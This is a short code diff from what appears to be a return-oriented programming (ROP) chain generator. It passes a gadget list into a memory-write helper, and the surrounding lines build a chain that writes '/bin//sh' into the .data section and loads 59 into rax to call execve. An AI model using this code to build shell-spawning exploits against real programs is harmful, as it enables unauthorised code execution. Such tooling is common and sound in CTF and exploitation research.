@@ -148,10 +148,10 @@ def canWrite(movQwordGadgets, popGadgets):
             return [gadget, pop1, pop2] # returns [ mov qword ptr [rega], reb, pop rega, pop regb ] 
     return list()
 
-def WriteStuffIntoMemory(data, addr, fd) : 
+def WriteStuffIntoMemory(GadgetList, data, addr, fd) : 
 
-    popGadgets = getPopGadgets(allGadgets)
-    movQwordGadgets = getMovQwordGadgets(allGadgets)
+    popGadgets = getPopGadgets(GadgetList)
+    movQwordGadgets = getMovQwordGadgets(GadgetList)
 
     movpopGadgets = canWrite(movQwordGadgets, popGadgets)
 
@@ -289,7 +289,7 @@ def execve_bin_sh(GadgetList, data_section_addr) :
     # Step-2: Writing "/bin//sh" into .data section
     binsh = 0x68732f2f6e69622f
     binsh = struct.pack('<Q', binsh)
-    WriteStuffIntoMemory(binsh, data_section_addr, fd)
+    WriteStuffIntoMemory(GadgetList, binsh, data_section_addr, fd)
  
     # Step-1: rax <- 59
     LoadConstIntoReg(GadgetList, "rax", 59, fd)
